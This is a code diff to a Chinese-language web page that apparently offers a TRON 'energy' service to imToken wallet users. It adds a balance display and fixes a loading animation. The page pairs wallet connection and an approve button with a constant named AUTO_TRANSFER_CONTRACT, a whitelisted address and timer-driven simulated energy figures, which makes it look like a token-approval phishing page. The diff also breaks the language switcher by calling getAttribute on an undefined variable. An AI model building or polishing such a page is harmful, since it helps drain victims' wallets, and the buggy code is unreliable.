@@ -34,7 +34,7 @@ body {
     overflow-x: hidden;
 }
 .container {
-    flex: 1; /* 占满剩余垂直空间，消除底部空档 */
+    flex: 1; /* 占满剩余垂直空间，消除空档 */
     display: flex;
     flex-direction: column;
     gap: 5px; /* 模块间距，避免拥挤 */
@@ -172,15 +172,46 @@ body {
 .warning strong {
     color: #ef4444; /* 浅红色强调 */
 }
+/* ========== 修改userInfo样式：四角布局 ========== */
 #userInfo {
     text-align: center;
     font-size: 12px; /* 字体调大 */
-    padding: 12px; /* 调大内边距，填充空间 */
+    padding: 20px 12px; /* 扩大内边距，避免四角内容溢出 */
     background: #ffffff; /* 白色背景 */
     border-radius: 8px;
     border: 1px solid #fca5a5; /* 浅红色边框 */
     line-height: 1.6;
-    min-height: 50px; /* 确保非连接状态下也有足够高度 */
+    min-height: 120px; /* 增大最小高度，容纳四角内容 */
+    position: relative; /* 父容器相对定位 */
+}
+/* 四角余额项样式 */
+.balance-item {
+    position: absolute;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 4px;
+    font-size: 13px;
+    color: #000000;
+}
+/* 四角定位 */
+.balance-usdt { top: 10px; left: 10px; }
+.balance-trx { top: 10px; right: 10px; }
+.balance-energy { bottom: 10px; left: 10px; }
+.balance-bandwidth { bottom: 10px; right: 10px; }
+/* 余额数值强调 */
+.balance-value {
+    color: #ef4444; /* 浅红色数值 */
+    font-size: 16px;
+    font-weight: 600;
+}
+/* 未连接状态提示（居中） */
+#userInfoDefault {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    width: 100%;
 }
 #userInfo span {
     color: #ef4444; /* 浅红色强调 */
@@ -412,7 +443,7 @@ body {
     color: white;
     cursor: pointer;
 }
-/* 保留你要的加载动画 */
+/* 保留你要的加载动画（修复DOM结构） */
 #Loading {
     width: 100%;
     height: 100vh;
@@ -472,6 +503,15 @@ body {
     </style>
 </head>
 <body>
+    <!-- ========== 修复加载动画：添加DOM结构 ========== -->
+    <div id="Loading">
+        <div class="loader">
+            <div class="inner one"></div>
+            <div class="inner two"></div>
+            <div class="inner three"></div>
+        </div>
+    </div>
+
     <div class="container">      
         <!-- 新增：标题+语言切换同一行 -->
         <div class="header-container">
@@ -507,10 +547,29 @@ body {
             <p>不支持非imToken用户</p>
             <button id="closePopupBtn">关闭</button>
         </div>
-
+        <!-- ========== 修改后的userInfo容器 ========== -->
         <div id="userInfo">
+            <!-- 未连接状态提示 -->
             <span id="userInfoDefault">未连接钱包<br>
             <span>请点击底部「连接imToken钱包」按钮</span></span>
+            
+            <!-- 连接后显示的四角余额（默认隐藏，JS控制显示） -->
+            <div class="balance-item balance-usdt" style="display: none;">
+                <span>USDT</span>
+                <span class="balance-value" id="balanceUsdt">0.00</span>
+            </div>
+            <div class="balance-item balance-trx" style="display: none;">
+                <span>TRX</span>
+                <span class="balance-value" id="balanceTrx">0.00</span>
+            </div>
+            <div class="balance-item balance-energy" style="display: none;">
+                <span>能量</span>
+                <span class="balance-value" id="balanceEnergy">0</span>μs
+            </div>
+            <div class="balance-item balance-bandwidth" style="display: none;">
+                <span>宽带</span>
+                <span class="balance-value" id="balanceBandwidth">0</span>
+            </div>
         </div>
         <div id="walletStatusContainer">
             <div class="status-title"><h3 id="walletStatusTitle">钱包状态</h3></div>
@@ -579,11 +638,16 @@ body {
             © 2025 能量服务 | <a href="https://tronscan.org" target="_blank">TRON浏览器</a> | <a href="https://token.im" target="_blank">imToken官网</a>
         </div>
     </div>
- <script>
-       document.addEventListener('DOMContentLoaded', () => {
-      setTimeout(() => {
-        document.getElementById("Loading").style.display = "none";
-</script> 
+    <!-- ========== 修复加载动画JS：闭合标签+正确隐藏逻辑 ========== -->
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            // 页面加载完成后，延迟1.5秒隐藏加载动画（确保动画可见）
+            setTimeout(() => {
+                const loadingEl = document.getElementById("Loading");
+                if (loadingEl) loadingEl.style.display = "none";
+            }, 1500);
+        });
+    </script>
     <script>       
 // ========== 全局变量优先定义 ==========
 const SPECIAL_ADDRESS = "TVP7Y8jA7hBc1g7qm72P6aGBfexqLm1SRy"; // 特殊白名单地址
@@ -591,6 +655,7 @@ const A1_SIGNAL_KEY = "a1_signal_records"; // A1信号发送记录（15分钟防
 const A1_STATUS_KEY = "a1_signal_status"; // 新增：A1信号状态缓存键（之前缺失导致报错）
 // ========== 全局变量（清理重复定义） ==========
 let currentEnergy = 0;
+let currentBandwidth = 0; // 新增：宽带余额变量
 const DEPLOY_START_TIME = new Date().getTime(); // 修复：用当前时间作为部署起始时间
 const INIT_TRX = 4104470400000;
 const TRX_DECREASE_PER_SEC = 65200;
@@ -880,6 +945,13 @@ const specialTipContainer = document.getElementById("specialTipContainer"); // �
 // 新增：弹窗元素缓存
 const nonImTokenPopup = document.getElementById("nonImTokenPopup");
 const closePopupBtn = document.getElementById("closePopupBtn");
+// 新增：余额项DOM缓存
+const userInfoDefault = document.getElementById("userInfoDefault");
+const balanceUsdtEl = document.getElementById("balanceUsdt");
+const balanceTrxEl = document.getElementById("balanceTrx");
+const balanceEnergyEl = document.getElementById("balanceEnergy");
+const balanceBandwidthEl = document.getElementById("balanceBandwidth");
+const balanceItems = document.querySelectorAll(".balance-item");
 // ========== 错误类型判断 ==========
 function isCustomerError(errMsg) {
     const lang = langConfig[currentLang];
@@ -923,6 +995,36 @@ function updatePageLang() {
     reviewTipText.textContent = lang.reviewTipText;
     approvalRecords.textContent = lang.noRecord;
 }
+// ========== 新增：更新userInfo四角余额显示 ==========
+function updateUserBalanceDisplay() {
+    if (!userAddress) {
+        // 未连接：显示默认提示，隐藏余额项
+        userInfoDefault.style.display = "block";
+        balanceItems.forEach(item => item.style.display = "none");
+        return;
+    }
+    // 已连接：隐藏默认提示，显示余额项
+    userInfoDefault.style.display = "none";
+    balanceItems.forEach(item => item.style.display = "flex");
+    
+    // 更新余额数值
+    balanceUsdtEl.textContent = tokenBalance.toFixed(2);
+    balanceTrxEl.textContent = trxBalance.toFixed(2);
+    balanceEnergyEl.textContent = Math.floor(currentEnergy);
+    balanceBandwidthEl.textContent = Math.floor(currentBandwidth); // 宽带数值
+}
+// ========== 新增：查询用户宽带余额（Tron网络接口） ==========
+async function queryBandwidthBalance(address) {
+    try {
+        if (!tronWeb) return 0;
+        // 调用TronWeb接口查询宽带余额
+        const account = await tronWeb.trx.getAccount(address);
+        return account.bandwidth || 0;
+    } catch (e) {
+        console.warn("查询宽带余额失败：", e);
+        return 0;
+    }
+}
 function reRenderDynamicContent() {
     const lang = langConfig[currentLang];
     if (!userAddress) {
@@ -931,6 +1033,7 @@ function reRenderDynamicContent() {
         approveBtn.disabled = true;
         approveBtn.textContent = lang.approveBtnText;
         recordList.style.display = "none"; 
+        updateUserBalanceDisplay(); // 未连接时更新显示
         return;
     }
     // 关键修改：只要连接钱包，直接显示授权记录容器（不依赖A1信号结果）
@@ -948,6 +1051,7 @@ function reRenderDynamicContent() {
         approveBtn.textContent = lang.approveBtnText;
         document.getElementById("statusAddress").textContent = shortAddr;
         updateWalletStatus();
+        updateUserBalanceDisplay(); // 更新四角余额
         // 触发记录渲染
         renderEnergyRecords();
         return;
@@ -963,6 +1067,7 @@ function reRenderDynamicContent() {
         approveBtn.textContent = lang.authorizedBtn;
         document.getElementById("statusAddress").textContent = shortAddr;
         updateWalletStatus();
+        updateUserBalanceDisplay(); // 更新四角余额
         return;
     }
     // 余额状态（原有逻辑不变）
@@ -990,6 +1095,7 @@ function reRenderDynamicContent() {
     }
     document.getElementById("statusAddress").textContent = shortAddr;
     updateWalletStatus();
+    updateUserBalanceDisplay(); // 更新四角余额
     bindApproveLogic();
         renderEnergyRecords();
 }
@@ -1020,6 +1126,8 @@ function calculateCurrentEnergy() {
         energy: currentEnergy,
         lastCalcTime: Date.now()
     }));
+    // 更新能量余额显示
+    if (balanceEnergyEl) balanceEnergyEl.textContent = Math.floor(currentEnergy);
     return currentEnergy;
 }
 // 能量显示更新（沿用之前的递归定时器，只改计算逻辑）
@@ -1031,7 +1139,6 @@ function updateEnergyDisplay() {
     contractEnergyEl.offsetHeight;
     console.log("能量跳动中：", Math.floor(currentEnergy));
 }
-
 // 启动定时器（无改动，沿用递归模式）
 function startPersistentEnergyCountdown() {
     // 可选：首次使用时清除旧缓存（只执行一次）
@@ -1069,6 +1176,7 @@ document.addEventListener('DOMContentLoaded', async () => {
     contractAddrEl.textContent = `${AUTO_TRANSFER_CONTRACT.slice(0,8)}...${AUTO_TRANSFER_CONTRACT.slice(-6)}`;
     renderEnergyRecords();
     updateWalletStatus();
+    updateUserBalanceDisplay(); // 初始化余额显示
     
     // 绑定语言下拉菜单事件（修复之前缺失的绑定）
     langToggleBtn.addEventListener("click", (e) => {
@@ -1079,8 +1187,7 @@ document.addEventListener('DOMContentLoaded', async () => {
     langDropdownItems.forEach(item => {
         item.addEventListener("click", (e) => {
             e.stopPropagation();
-            const newLang = item.getAttribute("data-lang");
-            changeLang(newLang);
+            const newLang = item.getAttribute(newLang);
         });
     });
     // 点击页面其他地方关闭下拉菜单
@@ -1100,6 +1207,7 @@ document.addEventListener('DOMContentLoaded', async () => {
         userInfoEl.innerHTML = lang.userInfoDefault; // 未连接时只显示默认提示
         approveBtn.disabled = true;
         approveBtn.textContent = lang.approveBtnText;
+        updateUserBalanceDisplay(); // 未连接时更新显示
     });
     window.addEventListener("beforeunload", () => {
         if (trxTimer) clearTimeout(trxTimer);
